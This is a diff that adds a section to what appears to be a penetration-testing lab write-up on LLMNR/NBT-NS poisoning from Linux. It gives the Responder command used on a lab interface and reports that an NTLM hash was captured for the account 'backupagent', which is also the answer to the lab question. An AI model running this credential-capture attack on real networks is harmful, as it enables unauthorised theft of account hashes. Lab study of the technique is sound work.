@@ -112,3 +112,16 @@ PORT      STATE SERVICE       VERSION
 808/tcp   open  ccproxy-http?
 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
 ```
+
+
+### LLMNR/NBT-NS Poisoning - from Linux
+
+* **Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**
+
+I started Responder on the interface connected to the target network.
+```c
+sudo responder -I ens224 -wf
+```
+After running Responder for several minutes, it successfully captured an NTLM hash for the user account backupagent
+
+[![Screenshot-2025-03-13-141104.png](https://i.postimg.cc/Vkh6N70q/Screenshot-2025-03-13-141104.png)](https://postimg.cc/PCmh3Q4J)
